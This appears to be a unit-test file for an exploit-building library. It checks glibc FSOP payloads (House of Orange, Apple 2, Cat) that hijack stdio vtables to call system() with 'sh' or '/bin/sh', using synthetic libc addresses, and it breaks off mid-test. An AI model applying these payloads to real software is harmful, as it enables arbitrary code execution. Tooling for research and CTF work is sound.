from __future__ import annotations

import unittest

from payloads.fsop import (
    FSOP,
    DispatchAttestation,
    FSOPActivation,
    FSOPCapabilityError,
    FSOPError,
    FSOPFamily,
    FSOPOverlayError,
    FSOPStream,
    FSOPTechnique,
    IOJumpSlot,
    IOVtableBounds,
)
from payloads.libc import LibcIdentity, LibcImage
from payloads.model import Address, Image, Payload, PayloadKind, RuntimeLayout
from payloads.rop import bind_libc_address
from payloads.target import ABI, SUPPORTED_TARGETS, Architecture, Endian, Target, resolve_target

_STANDARD_STREAM_SYMBOLS = {
    FSOPStream.STDOUT: "_IO_2_1_stdout_",
    FSOPStream.STDERR: "_IO_2_1_stderr_",
    FSOPStream.STDIN: "_IO_2_1_stdin_",
}

_SYMBOLS = {
    "system": 0x5000,
    "puts": 0x5100,
    "_IO_2_1_stdout_": 0x10000,
    "_IO_2_1_stderr_": 0x11000,
    "_IO_2_1_stdin_": 0x12000,
    "_IO_list_all": 0x13000,
    "_IO_file_jumps": 0x14000,
    "_IO_wfile_jumps": 0x15000,
    "_IO_wfile_jumps_mmap": 0x16000,
    "_IO_wfile_jumps_maybe_mmap": 0x17000,
    "_IO_str_jumps": 0x18000,
    "_IO_wstr_jumps": 0x19000,
}


def _libc(target: Target, version: str | None = "2.39") -> LibcImage:
    identity = LibcIdentity.from_bytes(
        f"fsop fixture {target.name} {version}".encode(),
        glibc_version=version,
    )
    return LibcImage(identity, target, _SYMBOLS)


def _file_plus_size(target: Target) -> int:
    if target.bits == 64:
        return 0xE0
    if target.abi is ABI.I386_SYSV:
        return 0x98
    return 0xA0


def _callback_is_descriptor(target: Target) -> bool:
    return target.abi is ABI.POWERPC64_ELFV1


def _placement(payload, name: str):
    matches = [item for item in payload.placements if item.name == name]
    if len(matches) != 1:
        raise AssertionError(f"expected one {name!r} placement, got {[item.name for item in payload.placements]!r}")
    return matches[0]


def _materialized_bytes(payload, placement: str, layout: RuntimeLayout | None = None) -> bytes:
    writes = payload.materialize(layout)
    matches = [item for item in writes if item.placement == placement]
    if len(matches) != 1 or matches[0].offset != 0:
        raise AssertionError(f"expected one complete write for {placement!r}, got {matches!r}")
    return matches[0].data


def _assert_callback_relocation_is_target_packed(
    test: unittest.TestCase,
    payload,
    libc: LibcImage,
    *,
    libc_base: int,
) -> None:
    callbacks = [item for item in payload.relocations if "callback" in item.role]
    test.assertEqual(len(callbacks), 1, callbacks)
    callback = callbacks[0]
    test.assertEqual(callback.width, libc.target.word_size)
    data = _materialized_bytes(payload, callback.placement, RuntimeLayout(libc_base=libc_base))
    test.assertEqual(
        data[callback.offset : callback.offset + callback.width],
        libc.target.pack(libc_base + libc.offset("system")),
    )


def _legacy_builder(
    target: Target,
    *,
    stream: FSOPStream = FSOPStream.HEAP,
    version: str | None = "2.23",
    bypass: bool = False,
) -> FSOP:
    if version == "2.23" and target.arch is Architecture.RISCV64:
        version, bypass = "2.27", True
    elif version == "2.23" and target.arch is Architecture.RISCV32:
        version, bypass = "2.33", True
    kwargs: dict[str, object] = {
        "stream": stream,
        "family": FSOPFamily.LEGACY,
        "storage": 0x500000,
        "glibc_version": version,
        "allow_vtable_bypass": bypass,
    }
    if stream is FSOPStream.HEAP:
        kwargs["address"] = 0x400000
    return FSOP(_libc(target, version), **kwargs)


def _wide_builder(
    target: Target,
    *,
    stream: FSOPStream = FSOPStream.HEAP,
    version: str | None = "2.39",
) -> FSOP:
    libc = _libc(target, version)
    io_vtables = IOVtableBounds(
        bind_libc_address(libc, "_IO_file_jumps"),
        bind_libc_address(libc, "_IO_wfile_jumps") + 21 * target.word_size,
        "synthetic fixture __io_vtables bounds",
    )
    kwargs: dict[str, object] = {
        "stream": stream,
        "family": FSOPFamily.WIDE,
        "storage": 0x600000,
        "io_vtables": io_vtables,
        "glibc_version": version,
    }
    if stream is FSOPStream.HEAP:
        kwargs["address"] = 0x410000
    return FSOP(libc, **kwargs)


class FSOPLayoutMatrixTests(unittest.TestCase):
    def test_legacy_file_and_vtable_layouts_cover_all_catalog_targets(self) -> None:
        libc_base = 0x70000000
        for target in SUPPORTED_TARGETS:
            with self.subTest(target=target.name):
                version = (
                    "2.27"
                    if target.arch is Architecture.RISCV64
                    else "2.33"
                    if target.arch is Architecture.RISCV32
                    else "2.23"
                )
                bypass = target.arch in {Architecture.RISCV32, Architecture.RISCV64}
                libc = _libc(target, version)
                payload = FSOP(
                    libc,
                    stream=FSOPStream.HEAP,
                    family=FSOPFamily.LEGACY,
                    address=0x400000,
                    storage=0x500000,
                    glibc_version=version,
                    allow_vtable_bypass=bypass,
                ).build(
                    FSOPActivation.EXPLICIT,
                    "system",
                    slot=IOJumpSlot.OVERFLOW,
                    dispatch_attested=True,
                    callback_is_descriptor=_callback_is_descriptor(target),
                )

                file = _placement(payload, "file")
                table = _placement(payload, "vtable")
                self.assertEqual(len(file.data), _file_plus_size(target))
                self.assertEqual(len(file.mask), len(file.data))
                self.assertEqual(len(table.data), 21 * target.word_size)
                self.assertEqual(len(table.mask), len(table.data))
                self.assertTrue(file.owned)
                self.assertTrue(table.owned)
                self.assertEqual(set(file.mask), {0xFF})
                self.assertEqual(set(table.mask), {0xFF})
                self.assertTrue(all(item.width == target.word_size for item in payload.relocations))
                _assert_callback_relocation_is_target_packed(self, payload, libc, libc_base=libc_base)

    def test_flags2_packing_tracks_the_241_three_byte_big_endian_change(self) -> None:
        for target_name in ("x86", "mipseb", "x86_64", "mips64eb"):
            target = resolve_target(target_name)
            for version, width in (("2.40", 4), ("2.41", 3)):
                with self.subTest(target=target.name, version=version):
                    layout = _wide_builder(target, version=version).layout
                    self.assertEqual(layout.flags2_size, width)
                    self.assertEqual(layout.pack_flags2(0x123456), (0x123456).to_bytes(width, target.endian.value))
                    if version == "2.41":
                        self.assertEqual(
                            layout.file_offsets["short_backupbuf"],
                            layout.file_offsets["flags2"] + 3,
                        )

    def test_wide_layouts_and_callback_relocations_cover_all_catalog_targets(self) -> None:
        libc_base = 0x71000000
        for target in SUPPORTED_TARGETS:
            with self.subTest(target=target.name):
                libc = _libc(target)
                payload = FSOP(
                    libc,
                    stream=FSOPStream.HEAP,
                    family=FSOPFamily.WIDE,
                    address=0x410000,
                    storage=0x600000,
                    glibc_version="2.39",
                ).build(
                    FSOPActivation.EXIT,
                    "system",
                    slot=IOJumpSlot.DOALLOCATE,
                    callback_is_descriptor=_callback_is_descriptor(target),
                )

                names = {item.name for item in payload.placements}
                self.assertTrue({"file", "wide_data", "wide_vtable"}.issubset(names), names)
                self.assertEqual(len(_placement(payload, "file").data), _file_plus_size(target))
                self.assertTrue(all(item.width == target.word_size for item in payload.relocations))
                for placement in payload.placements:
                    self.assertEqual(len(placement.mask), len(placement.data))
                    if placement.owned:
                        self.assertEqual(set(placement.mask), {0xFF})
                _assert_callback_relocation_is_target_packed(self, payload, libc, libc_base=libc_base)


class FSOPStreamStorageTests(unittest.TestCase):
    def test_absolute_and_runtime_resolved_placement_constraints_fail_closed(self) -> None:
        target = resolve_target("x86_64")
        with self.assertRaisesRegex(FSOPError, "aligned"):
            FSOP(
                _libc(target, "2.23"),
                stream=FSOPStream.HEAP,
                family=FSOPFamily.LEGACY,
                address=0x400001,
                storage=0x500000,
                glibc_version="2.23",
            ).build(FSOPActivation.FFLUSH, "system")

        payload = FSOP(
            _libc(target, "2.23"),
            stream=FSOPStream.HEAP,
            family=FSOPFamily.LEGACY,
            address=Address(0x100, Image.STACK),
            storage=Address(0x200, Image.MAIN),
            glibc_version="2.23",
        ).build(FSOPActivation.FFLUSH, "system")
        with self.assertRaisesRegex(FSOPError, "resolved placements.*overlap"):
            payload.writes(RuntimeLayout(stack_base=0x1000, main_base=0xF00, libc_base=0x70000000))

        unaligned = FSOP(
            _libc(target, "2.23"),
            stream=FSOPStream.HEAP,
            family=FSOPFamily.LEGACY,
            address=Address(0x100, Image.STACK),
            storage=Address(0x200, Image.MAIN),
            glibc_version="2.23",
        ).build(FSOPActivation.FFLUSH, "system")
        with self.assertRaisesRegex(FSOPError, "aligned"):
            unaligned.writes(RuntimeLayout(stack_base=0x1001, main_base=0x2000, libc_base=0x70000000))

    def test_all_standard_streams_resolve_their_exact_libc_objects(self) -> None:
        target = resolve_target("x86_64")
        libc_base = 0x7F0000000000
        layout = RuntimeLayout(libc_base=libc_base)
        for stream, symbol in _STANDARD_STREAM_SYMBOLS.items():
            with self.subTest(stream=stream.value):
                payload = _legacy_builder(target, stream=stream).build(FSOPActivation.FFLUSH, "system")
                file = _placement(payload, "file")
                self.assertIs(payload.stream, stream)
                self.assertFalse(file.owned)
                self.assertIn(0, file.mask)
                self.assertIn(0xFF, file.mask)
                file_writes = [item for item in payload.writes(layout) if item.placement == "file"]
                self.assertTrue(file_writes)
                start = libc_base + _SYMBOLS[symbol]
                self.assertTrue(all(start <= item.address < start + len(file.data) for item in file_writes))

    def test_standard_stream_writes_are_sparse_but_full_materialization_needs_originals(self) -> None:
        target = resolve_target("x86_64")
        layout = RuntimeLayout(libc_base=0x7F0000000000)
        payload = _wide_builder(target, stream=FSOPStream.STDOUT).build(
            FSOPActivation.EXIT,
            "system",
            slot=IOJumpSlot.DOALLOCATE,
        )
        file = _placement(payload, "file")

        sparse = [item for item in payload.writes(layout) if item.placement == "file"]
        self.assertTrue(sparse)
        self.assertLess(sum(len(item.data) for item in sparse), len(file.data))
        with self.assertRaisesRegex(FSOPError, "original"):
            payload.materialize(layout)

        original = bytes([0xA5]) * len(file.data)
        materialized = payload.materialize(layout, originals={"file": original})
        file_writes = [item for item in materialized if item.placement == "file"]
        self.assertEqual(len(file_writes), 1)
        self.assertEqual(file_writes[0].offset, 0)
        self.assertEqual(len(file_writes[0].data), len(file.data))
        for offset, mask in enumerate(file.mask):
            if mask == 0:
                self.assertEqual(file_writes[0].data[offset], 0xA5)

    def test_owned_heap_payloads_are_complete_and_materialize_without_originals(self) -> None:
        target = resolve_target("mips64eb")
        payload = _wide_builder(target).build(
            FSOPActivation.EXIT,
            "system",
            slot=IOJumpSlot.DOALLOCATE,
        )
        file = _placement(payload, "file")
        self.assertTrue(file.owned)
        self.assertEqual(set(file.mask), {0xFF})
        writes = payload.materialize(RuntimeLayout(libc_base=0x70000000))
        file_writes = [item for item in writes if item.placement == "file"]
        self.assertEqual(len(file_writes), 1)
        self.assertEqual((file_writes[0].address, file_writes[0].offset), (0x410000, 0))
        self.assertEqual(len(file_writes[0].data), len(file.data))


class LegacyFSOPRouteTests(unittest.TestCase):
    def test_exit_and_fflush_all_use_overflow_but_direct_fflush_uses_sync(self) -> None:
        target = resolve_target("x86_64")
        for activation in (FSOPActivation.EXIT, FSOPActivation.FFLUSH_ALL):
            with self.subTest(activation=activation.value):
                payload = _legacy_builder(target).build(activation, "system")
                self.assertIs(payload.callback_slot, IOJumpSlot.OVERFLOW)
                self.assertIs(payload.technique, FSOPTechnique.HOUSE_OF_ORANGE)
                self.assertTrue(any("_IO_list_all" in item.name for item in payload.placements))

        direct = _legacy_builder(target, stream=FSOPStream.STDERR).build(FSOPActivation.FFLUSH, "system")
        self.assertIs(direct.callback_slot, IOJumpSlot.SYNC)
        self.assertIs(direct.technique, FSOPTechnique.LEGACY_FAKE_VTABLE)
        self.assertFalse(any("_IO_list_all" in item.name for item in direct.placements))

    def test_seek_selects_only_the_intended_primary_slot(self) -> None:
        target = resolve_target("x86_64")
        seekoff = _legacy_builder(target, stream=FSOPStream.STDOUT).build(FSOPActivation.SEEK, "system")
        seekpos = _legacy_builder(target, stream=FSOPStream.STDOUT).build(
            FSOPActivation.SEEK,
            "system",
            seek_entry="seekpos",
        )
        self.assertIs(seekoff.callback_slot, IOJumpSlot.SEEKOFF)
        self.assertIs(seekpos.callback_slot, IOJumpSlot.SEEKPOS)
        with self.assertRaises((ValueError, FSOPCapabilityError)):
            _legacy_builder(target).build(FSOPActivation.SEEK, "system", seek_entry="overflow")

    def test_explicit_dispatch_requires_both_a_slot_and_attestation(self) -> None:
        builder = _legacy_builder(resolve_target("x86_64"), stream=FSOPStream.STDIN)
        with self.assertRaisesRegex(FSOPCapabilityError, "slot"):
            builder.build(FSOPActivation.EXPLICIT, "system", dispatch_attested=True)
        with self.assertRaisesRegex(FSOPCapabilityError, "attest"):
            builder.build(FSOPActivation.EXPLICIT, "system", slot=IOJumpSlot.XSPUTN)

        payload = builder.build(
            FSOPActivation.EXPLICIT,
            "system",
            slot=IOJumpSlot.XSPUTN,
            dispatch_attested=True,
        )
        self.assertIs(payload.callback_slot, IOJumpSlot.XSPUTN)
        self.assertIs(payload.technique, FSOPTechnique.LEGACY_FAKE_VTABLE)

    def test_every_named_primary_slot_can_be_selected_explicitly(self) -> None:
        target = resolve_target("x86_64")
        builder = _legacy_builder(target, stream=FSOPStream.STDIN)
        for slot in IOJumpSlot:
            with self.subTest(slot=slot.value):
                payload = builder.build(
                    FSOPActivation.EXPLICIT,
                    "system",
                    slot=slot,
                    dispatch_attested=True,
                )
                callback = next(item for item in payload.relocations if "callback" in item.role)
                self.assertEqual(callback.offset, slot.index * target.word_size)

    def test_primary_vtable_validation_is_fail_closed_at_glibc_224(self) -> None:
        target = resolve_target("x86_64")
        accepted = _legacy_builder(target, version="2.23").build(FSOPActivation.FFLUSH, "system")
        self.assertIs(accepted.family, FSOPFamily.LEGACY)

        with self.assertRaisesRegex(FSOPCapabilityError, "vtable|2[.]24"):
            _legacy_builder(target, version="2.24").build(FSOPActivation.FFLUSH, "system")
        with self.assertRaisesRegex(FSOPCapabilityError, "version|capability"):
            _legacy_builder(target, version=None).build(FSOPActivation.FFLUSH, "system")

        bypassed = _legacy_builder(target, version="2.39", bypass=True).build(FSOPActivation.FFLUSH, "system")
        self.assertTrue(bypassed.metadata["vtable_validation_bypassed"])


class WideFSOPRouteTests(unittest.TestCase):
    def test_biased_primary_vtable_requires_exact_bounds_when_it_precedes_wfile_jumps(self) -> None:
        target = resolve_target("x86_64")
        libc = _libc(target)
        without_bounds = FSOP(
            libc,
            stream=FSOPStream.STDOUT,
            family=FSOPFamily.WIDE,
            storage=0x600000,
            glibc_version="2.39",
        )
        safe = without_bounds.build(FSOPActivation.EXIT, "system", slot=IOJumpSlot.DOALLOCATE)
        self.assertEqual(safe.metadata["primary_vtable_bounds_source"], "exact _IO_wfile_jumps symbol extent")
        self.assertFalse(safe.metadata["primary_vtable_bounds_attested"])
        with self.assertRaisesRegex(FSOPCapabilityError, "IOVtableBounds|primary-vtable validation"):
            without_bounds.build(FSOPActivation.FFLUSH, "system", slot=IOJumpSlot.DOALLOCATE)

        wrong_bounds = IOVtableBounds(
            bind_libc_address(libc, "_IO_wfile_jumps"),
            bind_libc_address(libc, "_IO_wfile_jumps") + 21 * target.word_size,
            "exact but too narrow fixture bounds",
        )
        with self.assertRaisesRegex(FSOPCapabilityError, "outside"):
            FSOP(
                libc,
                stream=FSOPStream.STDOUT,
                family=FSOPFamily.WIDE,
                storage=0x600000,
                io_vtables=wrong_bounds,
                glibc_version="2.39",
            ).build(FSOPActivation.FFLUSH, "system", slot=IOJumpSlot.DOALLOCATE)

        accepted = _wide_builder(target, stream=FSOPStream.STDOUT).build(
            FSOPActivation.FFLUSH,
            "system",
            slot=IOJumpSlot.DOALLOCATE,
        )
        self.assertTrue(accepted.metadata["primary_vtable_bounds_attested"])
        self.assertIn("fixture", accepted.metadata["primary_vtable_bounds_source"])

    def test_wide_layout_profile_changes_at_glibc_230(self) -> None:
        for target_name in ("x86", "x86_64"):
            target = resolve_target(target_name)
            for version, expected_offset, expected_size in (
                ("2.29", 0xB0 if target.bits == 32 else 0x130, 0xB4 if target.bits == 32 else 0x138),
                ("2.30", 0x88 if target.bits == 32 else 0xE0, 0x8C if target.bits == 32 else 0xE8),
            ):
                with self.subTest(target=target.name, version=version):
                    payload = _wide_builder(target, version=version).build(
                        FSOPActivation.EXIT,
                        "system",
                        slot=IOJumpSlot.DOALLOCATE,
                    )
                    wide_vtable_pointers = [
                        item for item in payload.relocations if item.placement == "wide_data" and "vtable" in item.role
                    ]
                    self.assertEqual(len(wide_vtable_pointers), 1, wide_vtable_pointers)
                    self.assertEqual(wide_vtable_pointers[0].offset, expected_offset)
                    self.assertEqual(payload.layout.wide_data_size, expected_size)

    def test_unknown_wide_layout_version_fails_closed(self) -> None:
        with self.assertRaisesRegex(FSOPCapabilityError, "version|wide layout"):
            _wide_builder(resolve_target("x86_64"), version=None).build(
                FSOPActivation.EXIT,
                "system",
                slot=IOJumpSlot.DOALLOCATE,
            )

    def test_exit_routes_distinguish_house_of_apple_2_and_house_of_cat(self) -> None:
        target = resolve_target("x86_64")
        builder = _wide_builder(target)
        apple = builder.build(FSOPActivation.EXIT, "system", slot=IOJumpSlot.DOALLOCATE)
        with self.assertRaisesRegex(FSOPCapabilityError, "attest|mode"):
            builder.build(FSOPActivation.EXIT, "system", slot=IOJumpSlot.OVERFLOW)
        cat = builder.build(
            FSOPActivation.EXIT,
            "system",
            slot=IOJumpSlot.OVERFLOW,
            dispatch_attestation=DispatchAttestation(
                source="overflow call site preserves a controlled fourth argument",
                seekoff_mode=3,
            ),
        )

        self.assertIs(apple.technique, FSOPTechnique.HOUSE_OF_APPLE_2)
        self.assertIs(apple.callback_slot, IOJumpSlot.DOALLOCATE)
        self.assertIs(cat.technique, FSOPTechnique.HOUSE_OF_CAT)
        self.assertIs(cat.callback_slot, IOJumpSlot.OVERFLOW)
        self.assertTrue(any("_IO_list_all" in item.name for item in apple.placements))
        self.assertTrue(any("_IO_list_all" in item.name for item in cat.placements))

    def test_fflush_all_and_direct_fflush_are_not_conflated(self) -> None:
        target = resolve_target("x86_64")
        global_flush = _wide_builder(target).build(
            FSOPActivation.FFLUSH_ALL,
            "system",
            slot=IOJumpSlot.DOALLOCATE,
        )
        direct_builder = _wide_builder(target, stream=FSOPStream.STDOUT)
        with self.assertRaisesRegex(FSOPCapabilityError, "attest|mode"):
            direct_builder.build(FSOPActivation.FFLUSH, "system", slot=IOJumpSlot.OVERFLOW)
        direct = direct_builder.build(
            FSOPActivation.FFLUSH,
            "system",
            slot=IOJumpSlot.OVERFLOW,
            dispatch_attestation=DispatchAttestation(
                source="sync call site preserves a controlled fourth argument",
                seekoff_mode=2,
            ),
        )

        self.assertIs(global_flush.technique, FSOPTechnique.HOUSE_OF_APPLE_2)
        self.assertTrue(any("_IO_list_all" in item.name for item in global_flush.placements))
        self.assertIs(direct.technique, FSOPTechnique.HOUSE_OF_CAT)
        self.assertIs(direct.callback_slot, IOJumpSlot.OVERFLOW)
        self.assertFalse(any("_IO_list_all" in item.name for item in direct.placements))
        self.assertNotEqual(
            global_flush.metadata.get("primary_dispatch_slot"), direct.metadata.get("primary_dispatch_slot")
        )

    def test_primary_vtable_biases_match_the_named_apple_and_cat_routes(self) -> None:
        target = resolve_target("x86_64")
        builder = _wide_builder(target, stream=FSOPStream.STDOUT)
        apple_fflush = builder.build(FSOPActivation.FFLUSH, "system", slot=IOJumpSlot.DOALLOCATE)
        apple_seek = builder.build(FSOPActivation.SEEK, "system", slot=IOJumpSlot.DOALLOCATE)
        cat_seek = builder.build(FSOPActivation.SEEK, "system", slot=IOJumpSlot.OVERFLOW)
        cat_fflush = builder.build(
            FSOPActivation.FFLUSH,
            "system",
            slot=IOJumpSlot.OVERFLOW,
            dispatch_attestation=DispatchAttestation(source="controlled rcx", seekoff_mode=3),
        )

        self.assertEqual(apple_fflush.metadata["primary_vtable_bias"], -9 * target.word_size)
        self.assertEqual(apple_seek.metadata["primary_vtable_bias"], -6 * target.word_size)
        self.assertEqual(cat_seek.metadata["primary_vtable_bias"], 0)
        self.assertEqual(cat_fflush.metadata["primary_vtable_bias"], -3 * target.word_size)

    def test_seek_mode_switch_only_claims_the_source_proven_seekoff_path(self) -> None:
        target = resolve_target("x86_64")
        builder = _wide_builder(target, stream=FSOPStream.STDERR)
        payload = builder.build(
            FSOPActivation.SEEK,
            "system",
            slot=IOJumpSlot.OVERFLOW,
            seek_entry="seekoff",
        )
        self.assertIs(payload.technique, FSOPTechnique.HOUSE_OF_CAT)
        self.assertIs(payload.callback_slot, IOJumpSlot.OVERFLOW)
        self.assertEqual(payload.metadata["primary_dispatch_slot"], IOJumpSlot.SEEKOFF.value)
        dispatch_evidence = f"{payload.metadata!r} {payload.preconditions!r}".lower()
        self.assertIn("mode", dispatch_evidence)
        self.assertIn("3", dispatch_evidence)
        self.assertIn("glibc", dispatch_evidence)
        self.assertNotIn("abi_dependent': true", dispatch_evidence)

        with self.assertRaisesRegex(FSOPCapabilityError, "seekpos|seekoff"):
            builder.build(
                FSOPActivation.SEEK,
                "system",
                slot=IOJumpSlot.OVERFLOW,
                seek_entry="seekpos",
            )

    def test_house_of_cat_attestation_requires_evidence_and_nonzero_mode(self) -> None:
        builder = _wide_builder(resolve_target("x86_64"))
        for attestation in (
            DispatchAttestation(source="controlled register", seekoff_mode=0),
            DispatchAttestation(source="controlled register"),
        ):
            with self.subTest(attestation=attestation), self.assertRaisesRegex(FSOPCapabilityError, "mode|nonzero"):
                builder.build(
                    FSOPActivation.FFLUSH_ALL,
                    "system",
                    slot=IOJumpSlot.OVERFLOW,
                    dispatch_attestation=attestation,
                )

        with self.assertRaises((TypeError, ValueError, FSOPCapabilityError)):
            DispatchAttestation(source="", seekoff_mode=1)

        accepted = builder.build(
            FSOPActivation.FFLUSH_ALL,
            "system",
            slot=IOJumpSlot.OVERFLOW,
            dispatch_attestation=DispatchAttestation(source="r10 is controlled", seekoff_mode=1),
        )
        evidence = f"{accepted.metadata!r} {accepted.preconditions!r}".lower()
        self.assertIn("r10 is controlled", evidence)
        self.assertIn("abi", evidence)

    def test_automatic_wide_routes_reject_an_unrelated_callback_slot(self) -> None:
        builder = _wide_builder(resolve_target("x86_64"))
        with self.assertRaisesRegex(FSOPCapabilityError, "slot|route"):
            builder.build(FSOPActivation.EXIT, "system", slot=IOJumpSlot.SYNC)
        with self.assertRaisesRegex(FSOPCapabilityError, "slot|route"):
            builder.build(FSOPActivation.FFLUSH, "system", slot=IOJumpSlot.FINISH)

    def test_wide_explicit_dispatch_requires_attestation_and_preserves_slot(self) -> None:
        builder = _wide_builder(resolve_target("x86_64"), stream=FSOPStream.STDIN)
        with self.assertRaisesRegex(FSOPCapabilityError, "attest"):
            builder.build(FSOPActivation.EXPLICIT, "system", slot=IOJumpSlot.IMBUE)
        payload = builder.build(
            FSOPActivation.EXPLICIT,
            "system",
            slot=IOJumpSlot.IMBUE,
            dispatch_attested=True,
        )
        self.assertIs(payload.technique, FSOPTechnique.WIDE_EXPLICIT)
        self.assertIs(payload.callback_slot, IOJumpSlot.IMBUE)
        self.assertIsNone(payload.metadata["primary_dispatch_slot"])
        self.assertEqual(payload.metadata["wide_dispatch_slot"], IOJumpSlot.IMBUE.value)
        self.assertTrue(payload.metadata["dispatch_attested"])


class FSOPOverlayTests(unittest.TestCase):
    def test_default_arg0_is_terminated_for_sparse_and_owned_streams(self) -> None:
        for target_name in ("x86_64", "mips64eb"):
            target = resolve_target(target_name)
            for stream in (FSOPStream.STDOUT, FSOPStream.HEAP):
                with self.subTest(target=target.name, stream=stream.value):
                    payload = _wide_builder(target, stream=stream).build(
                        FSOPActivation.FFLUSH,
                        "system",
                        slot=IOJumpSlot.DOALLOCATE,
                    )
                    file = _placement(payload, "file")
                    terminator = 3 if target.endian is Endian.LITTLE else 2
                    self.assertEqual(file.data[terminator], 0)
                    self.assertEqual(file.mask[terminator], 0xFF)

    def test_endian_safe_arg0_commands_are_accepted_for_every_target(self) -> None:
        libc_base = 0x72000000
        for target in SUPPORTED_TARGETS:
            with self.subTest(target=target.name, family="legacy"):
                legacy = _legacy_builder(target).build(
                    FSOPActivation.EXIT,
                    "system",
                    callback_is_descriptor=_callback_is_descriptor(target),
                )
                command = b"sh\0"
                overlaid = legacy.overlay(command)
                self.assertEqual(_materialized_bytes(overlaid, "file", RuntimeLayout(libc_base=libc_base))[:3], command)
                self.assertEqual(overlaid.metadata["callback_argument"], "file")

            with self.subTest(target=target.name, family="wide"):
                wide = _wide_builder(target).build(
                    FSOPActivation.EXIT,
                    "system",
                    slot=IOJumpSlot.DOALLOCATE,
                    callback_is_descriptor=_callback_is_descriptor(target),
                )
                # The low-order flags must not set _IO_NO_WRITES,
                # _IO_UNBUFFERED, or _IO_CURRENTLY_PUTTING.  Their byte
                # positions differ by byte order, while the callback still
                # receives a valid shell command at fp.
                command = b"  sh\0" if target.endian is Endian.LITTLE else b"sh\0\0"
                overlaid = wide.overlay(command)
                self.assertEqual(
                    _materialized_bytes(overlaid, "file", RuntimeLayout(libc_base=libc_base))[: len(command)],
                    command,
                )

    def test_payload_overlay_is_supported_and_target_mismatch_is_rejected(self) -> None:
        target = resolve_target("x86_64")
        fsop = _legacy_builder(target).build(FSOPActivation.EXIT, "system")
        command = Payload(b"sh\0", target, PayloadKind.DATA, "command prefix")
        self.assertEqual(_placement(fsop.overlay(command), "file").data[:3], b"sh\0")

        wrong_target = Payload(b"sh\0", resolve_target("x86"), PayloadKind.DATA, "wrong target")
        with self.assertRaisesRegex(FSOPOverlayError, "target"):
            fsop.overlay(wrong_target)

    def test_wide_flags_conflicts_are_rejected_but_legacy_arg0_flags_are_semantic_free(self) -> None:
        for target in (resolve_target("x86_64"), resolve_target("mips64eb")):
            with self.subTest(target=target.name):
                forbidden_flags = (0x8).to_bytes(4, target.endian.value)
                wide = _wide_builder(target).build(
                    FSOPActivation.EXIT,
                    "system",
                    slot=IOJumpSlot.DOALLOCATE,
                )
                with self.assertRaisesRegex(FSOPOverlayError, "flag|_IO_NO_WRITES"):
                    wide.overlay(forbidden_flags, offset=0)

                legacy = _legacy_builder(target).build(FSOPActivation.EXIT, "system")
                self.assertEqual(_placement(legacy.overlay(forbidden_flags), "file").data[:4], forbidden_flags)

    def test_pointer_relation_conflicts_are_rejected(self) -> None:
        for target in (resolve_target("x86"), resolve_target("mipseb"), resolve_target("x86_64")):
            with self.subTest(target=target.name):
                payload = _legacy_builder(target).build(FSOPActivation.EXIT, "system")
                first_pointer = 8 if target.bits == 64 else 4
                write_base_offset = first_pointer + 3 * target.word_size
                with self.assertRaisesRegex(FSOPOverlayError, "write|relation|pointer"):
                    payload.overlay(target.pack(target.mask), offset=write_base_offset)

    def test_relocation_bytes_cannot_be_replaced_by_an_opaque_overlay(self) -> None:
        payload = _wide_builder(resolve_target("x86_64")).build(
            FSOPActivation.EXIT,
            "system",
            slot=IOJumpSlot.DOALLOCATE,
        )
        relocation = payload.relocations[0]
        with self.assertRaisesRegex(FSOPOverlayError, "relocation"):
            payload.overlay(
                bytes(relocation.width),
                placement=relocation.placement,
                offset=relocation.offset,
            )

    def test_identical_concrete_relocation_and_relation_preserving_overlays_are_allowed(self) -> None:
        target = resolve_target("x86_64")
        callback = 0x4141414141414141
        payload = _legacy_builder(target).build(FSOPActivation.EXIT, callback)
        relocation = next(item for item in payload.relocations if "callback" in item.role)
        same = payload.overlay(
            target.pack(callback),
            placement=relocation.placement,
            offset=relocation.offset,
        )
        self.assertEqual(
            _placement(same, relocation.placement).data[relocation.offset : relocation.offset + 8],
            target.pack(callback),
        )

        write_ptr_offset = payload.layout.file_offsets["write_ptr"]
        changed = payload.overlay(target.pack(2), placement="file", offset=write_ptr_offset)
        self.assertEqual(_placement(changed, "file").data[write_ptr_offset : write_ptr_offset + 8], target.pack(2))

    def test_overlay_bounds_and_unknown_placements_are_rejected(self) -> None:
        payload = _legacy_builder(resolve_target("x86_64")).build(FSOPActivation.EXIT, "system")
        file = _placement(payload, "file")
        with self.assertRaisesRegex(FSOPOverlayError, "bounds|fit"):
            payload.overlay(b"AB", offset=len(file.data) - 1)
        with self.assertRaisesRegex(FSOPOverlayError, "placement"):
            payload.overlay(b"A", placement="missing")

    def test_sparse_standard_stream_live_fields_are_not_overlayable(self) -> None:
        target = resolve_target("x86_64")
        payload = _wide_builder(target, stream=FSOPStream.STDOUT).build(
            FSOPActivation.FFLUSH,
            "system",
            slot=IOJumpSlot.DOALLOCATE,
        )
        with self.assertRaisesRegex(FSOPOverlayError, "preserved live bytes|builder-owned"):
            payload.overlay(bytes(target.word_size), offset=payload.layout.file_offsets["lock"])
        with self.assertRaisesRegex(FSOPOverlayError, "preserved live bytes|builder-owned"):
            payload.overlay_arg0(b"  /bin/sh\0")

        owned = _wide_builder(target).build(
            FSOPActivation.FFLUSH,
            "system",
            slot=IOJumpSlot.DOALLOCATE,
        )
        self.assertEqual(_placement(owned.overlay_arg0(b"  /bin/sh\0"), "file").data[:10], b"  /bin/sh\0")


class FSOPCapabilityTests(unittest.TestCase):
    def test_missing_exact_libc_function_is_rejected(self) -> None:
        with self.assertRaisesRegex(FSOPError, "missing|symbol"):
            _wide_builder(resolve_target("x86_64")).build(
                FSOPActivation.EXIT,
                "missing_callback",
                slot=IOJumpSlot.DOALLOCATE,
            )

    def test_ppc64_elfv1_requires_explicit_function_descriptor_attestation(self) -> None:
        target = resolve_target("ppc64")
        for family, builder in (
            (FSOPFamily.LEGACY, _legacy_builder(target, stream=FSOPStream.STDOUT)),
            (FSOPFamily.WIDE, _wide_builder(target, stream=FSOPStream.STDOUT)),
        ):
            with self.subTest(family=family.value):
                activation = FSOPActivation.FFLUSH
                slot = None if family is FSOPFamily.LEGACY else IOJumpSlot.OVERFLOW
                dispatch_attestation = (
                    None
                    if family is FSOPFamily.LEGACY
                    else DispatchAttestation(source="controlled PPC64 argument register", seekoff_mode=3)
                )
                with self.assertRaisesRegex(FSOPCapabilityError, "descriptor|ELFv1"):
                    builder.build(
                        activation,
                        "system",
                        slot=slot,
                        dispatch_attestation=dispatch_attestation,
                    )
                payload = builder.build(
                    activation,
                    "system",
                    slot=slot,
                    dispatch_attestation=dispatch_attestation,
                    callback_is_descriptor=True,
                )
